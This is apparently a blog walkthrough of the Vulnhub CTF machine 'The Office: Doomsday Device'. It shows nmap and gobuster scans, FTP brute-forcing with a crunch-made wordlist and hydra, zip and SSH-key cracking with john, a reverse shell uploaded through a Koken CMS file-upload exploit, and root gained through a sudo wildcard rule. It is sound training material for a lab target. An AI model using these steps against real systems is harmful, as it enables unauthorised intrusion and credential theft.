---
title: "The Office: Doomsday Device Vulnhub CTF Walkthrough"
---

The VM can be found [here](https://www.vulnhub.com/entry/the-office-doomsday-device,627/). 

Description: 
{% highlight text %}
DETAILS
It's a very simple, beginner level, "The Office" themed CTF machine. Created and tested with VirtualBox. This box will assign itself an IP address through DHCP. You shouldn't have to configure anything else.

GOALS
There are 8 flags in total. Collect them all and get root access to defuse the Doomsday Device.

STORY
Dwight Schrute devised a system (called the Doomsday Device) to find mistakes made by employees in the office. It will forward incriminating emails to Robert California if employees make five mistakes in one day, effectively causing them to lose their jobs. Your goal is to find your way into the system and save everyone's job by getting root access.
{% endhighlight %}



nmap:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ nmap -p- -sV 192.168.56.181
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 14:15 EDT
Nmap scan report for 192.168.56.181
Host is up (0.00049s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.3
22/tcp    filtered ssh
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
18888/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))
65533/tcp open     http    Apache httpd 2.4.29
Service Info: Host: 127.0.1.1; OS: Unix
{% endhighlight %}


gobuster port 80:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.56.181/ -q -x php,html,txt   
/index.html           (Status: 200) [Size: 2819]
/robots.txt           (Status: 200) [Size: 42]  
/nick                 (Status: 301) [Size: 315] [--> http://192.168.56.181/nick/]
/staffblog            (Status: 301) [Size: 320] [--> http://192.168.56.181/staffblog/]
{% endhighlight %}

gobuster port 65533:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.56.181:65533/ -q -x php,html,txt
/secret               (Status: 301) [Size: 326] [--> http://192.168.56.181:65533/secret/]
{% endhighlight %}

Flag: `#FLAG2: 0a9025f72493da059a26db3acb0e2c42`

robots.txt:
{% highlight text %}
User-agent: *
Disallow: /nothingtoseehere
{% endhighlight %}

In the `nick` directory is a PCAP file. After loading the PCAP file into wireshark, we
can see some FTP credentials `creed:creed` these creds don't work with the FTP server
unfortunately. 

Moving on to the `staffblog` directory, we can see `CreedThoughts.doc` 
{% highlight terminal %}
Reminder: The IT guy told that my password is not safe enough. I wonder how he found out. Anyways, I added 3 digits to the end so it’s supersafe now. Nobody's gonna crack that, baby!
{% endhighlight %}

Here's a flag `#FLAG3: 50f1ff7bc72bb24c0082be83a8b8c497`

Let's generate a wordlist with crunch to fit the parameters "Creed" mentioned
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ crunch 8 8 -t creed%%% -o creedWordlist
{% endhighlight %}


Let's attack the FTP server login using the wordlist we just created:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ hydra -l creed -P creedWordlist ftp://192.168.56.181 -V
[21][ftp] host: 192.168.56.181   login: creed   password: creed223
{% endhighlight %}

Let's take a look around the FTP server:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ ftp 192.168.56.181                                                        130 ⨯
Connected to 192.168.56.181.
220 (vsFTPd 3.0.3)
Name (192.168.56.181:kali): creed
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2026 Nov 12 18:16 archive.zip
-rw-r--r--    1 0        0             176 Nov 30 09:05 reminder.txt
226 Directory send OK.
ftp> get reminder.txt
local: reminder.txt remote: reminder.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for reminder.txt (176 bytes).
226 Transfer complete.
176 bytes received in 0.01 secs (22.5351 kB/s)
ftp> get archive.zip
local: archive.zip remote: archive.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for archive.zip (2026 bytes).
226 Transfer complete.
2026 bytes received in 0.00 secs (527.3229 kB/s)
ftp> quit
221 Goodbye.
{% endhighlight %}

reminder.txt: 
{% highlight text %}
Oh snap, I forgot the password for this zip file. I remember, it made Michael laugh when he heard it, but Pam got really offended.
{% endhighlight %}

Another flag:`#FLAG4: 4955cbee5a6a5a48ce79624932bd1374` 

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ zip2john archive.zip > archive.hash

┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ john archive.hash
{% endhighlight %}

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ john --show archive.hash
archive.zip:bigboobz::archive.zip:email, michael:archive.zip

1 password hash cracked, 0 left
                                                                                    
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ unzip archive.zip
Archive:  archive.zip
[archive.zip] email password: 
  inflating: email                   
  inflating: michael    
{% endhighlight %}


{% highlight text %}
To: oscar@dundermifflin.com
Subject: Costume Party
From: michael@dundermifflin.com
Content-Type: text/html; charset="utf8"

Hey Oscar!

Angela is out sick so she couldn't manage the costume party gallery right now. Dwight showed up as a jamaican zombie woman AGAIN. It's gross. Please remove the picture from the gallery. Oh yeah, you don't have access to it, so just use Angela's profile. The password is most probably one of her cats name. 

Michael 

michael: 
{% endhighlight %}

{% highlight text %}
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,CF1CA7F9558B5637B0C9F66B972B6AB6

GlAt2Uhi+zBOMhGrASR0ica1YTk7BTBNzKAkqLGzyTy1eplEKiTou7LdW5hV7Khf
ZU+9X9Cg5L9KHT+w0OFQeVghzYOwZ+aeyzoii1Wo/pFx460eUj5oFTJnsN/UvHfi
sjGX8bLp4RT+HjTZr7b2+XiDww33xdskdnXeHBc9CsDRA+59x8+bszto+X3zaIVF
LaJ4nIx2nTVtn9DKEItfmsL3iCn4BKKT1kQ94K8R3Cx11Hdb49buByRYcICJhoT6
j416LKNUnH9F53dLyHrY6VoxjrckZWQC05DhiNgva6TxBqoX8XMEVWNf9UBoqsbl
MYVY5p2nbvM6u6pyViX6hSqLLxMe9kcyvYeC51irASXIlGZW6fQEieGesRm4uKG4
HeFtT57TXh7XIjqscqsR/swFMF9FGRRro0fCDTza3q+lKrmGWSQT6zM4F4iH0oOu
6K8cpe2JBfBQTHIXG136Xu4IF/4FVzXFfP4B920ecwTjRdxpeCZIKcItqp6dQ50f
HomaBFr0Bka/UfyJADDaDJ1oC78Vgg31y6QQwQsfKpiL0GDYwmCYFEk2/WBF8uyf
ZwTh0CnyUcIyXxv996ZLfX9RSRcrKXhMjw2YLz43cP5bkwUrBZ1/OnnCsxzaZWBX
r+NZEWkFIfFGat6RWmregVwR58oQg4s07fIIN+VFWTdCl9HGFlMGBrpUrly5PIzF
5hEIxDiuL6LEcW5kMYwtrPCo4QK+++KikySBpNaVxuY0Fy1E07AKyFl+7DMu82eH
hI29O4ebO0J15jxIX8Ta9dXCspqKbYeL6RMB6/uZEd61cP2Mh0Kd8K7rUuCdyOIF
7RXF61whnhy4YB7Um+O3iTABQjsR2T0+IKxasYEriuQNMrqMwtQXPIfxJ/wAcViA
mLKh/HoCUCfoC8+ksWwycYuEde06OxRH9zn0HITt5pgs+gtkBgGG25xSUbE9rGMC
iQGd/wDIcad0tjT9WnxoSPvlYRHSWLy5KjyGGShWRcXbMM4lhZbvHHktr6pD35rn
XMWdsLTKn5xr0IDF+iBNpd/cUKGO1Wi4TjZkZf6aTZZCzumrf3/A1ZH6pf32vRdg
9fA4eEHgwwn/qLJRYo33mj96+gBdRleYBaIxUmxm4VbJ8qkD0kthPI32LzvVgKOM
8q2J1cC7pJN5BVM1nmMPxz29MUZXvf4RU75p9fE1lBaX/5aBp+J7HUHREBg0cod6
6NHJ+u/WgGhrUGITi2V+4SL7Xi5F1ig2goA8EL5MYlnv4tU39Bihw6AOfqmGza9H
cQr9vsF1ryFXqAD7IxwjjTYgcTWxEj2P/LBzeC6rfLzgPeulPkPHVBaiB2lzIGEB
uExO3CjF9cqZMRyRo8XhOmrZw5vE2eO43uqpWFIwb4PUoG3uVcKEVqpuZ6bSYPvI
L59nw0ONv+1G4t4BG/WSHGKBq1hcpOpNIFGASFR8eVVchpK9OtMTwGvSp/M7diRR
/EjSLFhcBhKgjInCHgyRnQa5X3B6z9/HIGkwdH381CuXl5MYxDAt3S3IvJ6prolz
0lpnN5PD4wHHDdvVSntdV5w4rdJSdWaVcHohLLj/elYvPkjor8MARqeLatyYUL2y
-----END RSA PRIVATE KEY-----
{% endhighlight %}

cracking the RSA private key using john:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ /usr/share/john/ssh2john.py michael > michael.hash 

┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt michael.hash               1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
mypassword1234   (michael)

{% endhighlight %}

We can use `openssl` to write a decrypted id_rsa file to be used with SSH: 
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ openssl rsa -in michael -out id_rsa                                       255 ⨯
Enter pass phrase for michael:
writing RSA key
{% endhighlight %}

Let's use the newly written key to login via SSH: 
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ ssh -i id_rsa michael@192.168.56.181                                      255 ⨯
______                 _            ___  ____  __  __ _ _       
|  _  \               | |           |  \/  (_)/ _|/ _| (_)      
| | | |_   _ _ __   __| | ___ _ __  | .  . |_| |_| |_| |_ _ __  
| | | | | | | '_ \ / _` |/ _ \ '__| | |\/| | |  _|  _| | | '_ \ 
| |/ /| |_| | | | | (_| |  __/ |    | |  | | | | | | | | | | | |
|___/  \__,_|_| |_|\__,_|\___|_|    \_|  |_/_|_| |_| |_|_|_| |_|
michael@doomsday:~$ 
{% endhighlight %}

`.sus.txt` : `#FLAG7: 76a2ecd19b04acb89b7fe8c3d83296df`


Adding a `.ssh/authorized_keys` file to the user creed's home directory with our
`id_rsa.pub` key. 
{% highlight terminal %}
ftp> mkdir .ssh
257 "/.ssh" created
ftp> cd .ssh

ftp> put authorized_keys 
local: authorized_keys remote: authorized_keys
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
563 bytes sent in 0.00 secs (4.4743 MB/s)
{% endhighlight %}
This didn't work so onto other sections. 

Navigating to `http://192.168.56.181:18888/admin/` the clue was "The password is most probably one of her cats name."
after some guesswork here, I found that the password was Crinklepuss

Using searchsploit to find a vulnerability in the koken CMS:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ searchsploit koken                  
-------------------------------------------------- ---------------------------------
 Exploit Title                                    |  Path
-------------------------------------------------- ---------------------------------
Koken CMS 0.22.24 - Arbitrary File Upload (Authen | php/webapps/48706.txt
-------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                    
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ searchsploit -m php/webapps/48706.txt
  Exploit: Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)
      URL: https://www.exploit-db.com/exploits/48706
     Path: /usr/share/exploitdb/exploits/php/webapps/48706.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /home/kali/ctfs/doomsday-device/48706.txt
{% endhighlight %}
Once we gain access, uploading a reverse shell using the method in `48706.txt` is 
fairly simple. We then catch the reverse shell with netcat. 

{% highlight terminal %}
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@doomsday:/home$
{% endhighlight %}

#### enumerating the local file system
Poking around the file system in specifically `/var/www/` directory for any flags: 

{% highlight terminal %}
www-data@doomsday:/var/www/html/_hint_$ ls
ls
index.html  knockknock1.jpg  knockknock2.jpg  knockknock3.jpg
www-data@doomsday:/var/www/html/_hint_$
{% endhighlight %}

After running each of these images through `exiftool` I found the following flag:
`#FLAG6: c9db6b7cad326cab2bcf0d2a26f7832d`
the following string was also found in `knockknock2.jpg`
`Open sesame: 5000, 7000, 9000`
Let's use these to port knock with knockd 
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ knock -v 192.168.56.181 5000 7000 9000
hitting tcp 192.168.56.181:5000
hitting tcp 192.168.56.181:7000
hitting tcp 192.168.56.181:9000
                                                                                    
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ nmap -p22 192.168.56.181   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 16:07 EDT
Nmap scan report for 192.168.56.181
Host is up (0.0015s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
{% endhighlight %}



Onto the rest of the directories. In `html2` there's a backup file `index.html.bak`
containing the second flag: 
{% highlight terminal %}
www-data@doomsday:/var/www/html2/secret$ cat index.html.bak
cat index.html.bak
<!doctype html>
<html>
  <head>
    <title></title>
  </head>
  <body>
    <p>#FLAG2: 0a9025f72493da059a26db3acb0e2c42</p>
  </body>
</html>
{% endhighlight %}


Maybe we can switch to the `creed` user now that we've got a shell: 
{% highlight terminal %}
www-data@doomsday:/home$ su creed
su creed
Password: creed223

Nice Try, but this account is limited to FTP access only.
{% endhighlight %}

Moving back to the michael account let's look for some low hanging fruit:
{% highlight terminal %}
michael@doomsday:~$ sudo -l
Matching Defaults entries for michael on doomsday:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User michael may run the following commands on doomsday:
    (ALL) NOPASSWD: /home/creed/defuse*
{% endhighlight %}

Let's create a defuse.sh script that drops into a bash shell: 

{% highlight bash %}
#!/bin/bash
/bin/bash
{% endhighlight %}

Then upload it via FTP and change the permissions of the file so that it can be run
as root: 
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/doomsday-device]
└─$ ftp 192.168.56.181
Connected to 192.168.56.181.
220 (vsFTPd 3.0.3)
Name (192.168.56.181:kali): creed
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> delete defuse.sh 
250 Delete operation successful.
ftp> put defuse.sh 
local: defuse.sh remote: defuse.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
22 bytes sent in 0.00 secs (246.9468 kB/s)
ftp> chmod 777 defuse.sh 
200 SITE CHMOD command ok.
ftp> 
{% endhighlight %}

Getting root:
{% highlight terminal %}
michael@doomsday:~$ sudo /home/creed/defuse*
{% endhighlight %}

root flag.txt:
{% highlight terminal %}
IDENTITY THEFT IS NOT A JOKE! Millions of families suffer every year.
But anyways. You beat me. You are the superior being.

Dwight Schrute
Assistant Regional Manager

#FLAG8: ebadbecff2429a90287e1ed98960e3f6

  _____                  _             __  __ _  __  __ _ _       
 |  __ \                | |           |  \/  (_)/ _|/ _| (_)      
 | |  | |_   _ _ __   __| | ___ _ __  | \  / |_| |_| |_| |_ _ __  
 | |  | | | | | '_ \ / _` |/ _ \ '__| | |\/| | |  _|  _| | | '_ \ 
 | |__| | |_| | | | | (_| |  __/ |    | |  | | | | | | | | | | | |
 |_____/ \__,_|_| |_|\__,_|\___|_|    |_|  |_|_|_| |_| |_|_|_| |_|
                                                                  
                                                                 

{% endhighlight %}
